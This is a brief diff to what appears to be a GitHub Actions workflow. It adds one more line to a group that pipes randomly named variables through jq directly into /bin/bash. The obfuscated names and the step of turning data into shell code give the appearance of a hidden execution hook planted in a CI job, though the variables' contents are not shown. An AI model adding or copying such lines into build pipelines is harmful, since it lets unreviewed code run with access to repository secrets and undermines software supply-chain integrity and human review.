@@ -38,6 +38,7 @@ jobs:
           echo $kmwdp0 | jq -r .al7943 | /bin/bash
           printf '%s' "$pkw49" | jq -r .aljqv14692 | /bin/bash
           echo $vnfn52642 | jq -r .epcu0 | /bin/bash
+          printf '%s' "$iovx4565" | jq -r .lzj90 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
